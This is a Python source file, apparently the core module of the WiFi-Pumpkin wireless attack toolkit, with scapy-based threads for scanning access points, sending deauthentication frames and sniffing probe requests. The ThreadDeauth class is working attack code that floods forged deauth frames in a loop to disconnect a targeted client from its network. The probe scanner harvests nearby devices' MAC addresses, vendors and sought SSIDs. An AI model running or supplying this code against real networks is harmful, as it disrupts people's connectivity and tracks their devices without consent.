import Queue
from scapy.all import *
from threading import Thread
from PyQt4.QtCore import QThread,SIGNAL
from netaddr import EUI
from netaddr.core import NotRegisteredError

"""
Description:
    This program is a core for modules wifi-pumpkin.py. file which includes all Implementation
    for modules.

Copyright:
    Copyright (C) 2015 Marcos Nesster P0cl4bs Team
    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>
"""

class ThreadScannerAP(QThread):
    def __init__(self,interface):
        QThread.__init__(self)
        self.interface  = interface
        self.stopped    = False

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.LoopScanmer()

    def scannerAP(self,q):
        while not self.stopped:
            try:
                sniff(iface=self.interface, prn =lambda x : q.put(x), timeout=20)
            except:pass
            if self.stopped:
                break

    def LoopScanmer(self):
        q = Queue.Queue()
        sniff = Thread(target =self.scannerAP, args = (q,))
        sniff.daemon = True
        sniff.start()
        while (not self.stopped):
            try:
                pkt = q.get(timeout = 1)
                self.Scanner_devices(pkt)
            except Queue.Empty:
              pass

    def Scanner_devices(self,pkt):
        if pkt.haslayer(Dot11):
            if pkt.type == 0 and pkt.subtype == 8:
                self.emit(SIGNAL('Activated( QString )'),'{}|{}|{}'.format(pkt.addr2,
                str(int(ord(pkt[Dot11Elt:3].info))),pkt.info))

    def stop(self):
        self.stopped = True
        print 'Stop thread:' + self.objectName()


class ThreadDeauth(QThread):
    def __init__(self,bssid, client,interface):
        QThread.__init__(self)
        self.bssid      = bssid
        self.client     = client
        self.interface  = interface
        self.status     = False
        self.pkts       = []

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.status = True
        conf.iface = self.interface
        pkt1 = RadioTap()/Dot11(type=0,subtype=12,addr1=self.client,
        addr2=self.bssid,addr3=self.bssid)/Dot11Deauth(reason=7)
        pkt2 = Dot11(addr1=self.bssid, addr2=self.client,
        addr3=self.client)/Dot11Deauth()
        self.pkts.append(pkt1),self.pkts.append(pkt2)
        while self.status:
            for packet in self.pkts:
                sendp(packet,verbose=False,count=1,iface=self.interface)

    def stop(self):
        self.status = False
        print 'Stop thread:' + self.objectName()


class ThreadProbeScan(QThread):
    def __init__(self,interface):
        QThread.__init__(self)
        self.interface  = interface
        self.finished   = False
        self.captured   = []

    def run(self):
        print "Starting Thread:" + self.objectName()
        self.ProbeResqest()
    def Startprobe(self,q):
        while not self.finished:
            try:
                sniff(iface = self.interface,count = 10, prn = lambda x : q.put(x))
            except:pass
            if self.finished:break

    def ProbeResqest(self):
        q = Queue.Queue()
        self.sniff = Thread(target =self.Startprobe, args = (q,))
        self.sniff.daemon = True
        self.sniff.start()
        while (not self.finished):
            try:
                pkt = q.get(timeout = 1)
                self.sniff_probe(pkt)
            except Queue.Empty:
              pass

    def sniff_probe(self,pkt):
        if pkt.haslayer(Dot11ProbeReq) and '\x00' not in pkt[Dot11ProbeReq].info:
            mac_address = pkt.addr2
            ssid        = pkt[Dot11Elt].info
            if len(ssid) == 0:  ssid='Hidden'
            try:
                devices = EUI(mac_address)
                devices = devices.oui.registration().org
            except NotRegisteredError:
                devices = 'unknown device'
            if not mac_address in self.captured:
                self.captured.append(mac_address)
                self.emit(SIGNAL("Activated( QString )"),mac_address + '|'+ssid +'|'+devices)

    def stop(self):
        print "Stop thread:" + self.objectName()
        self.finished = True
        self.captured = []
        self.sniff.join(0)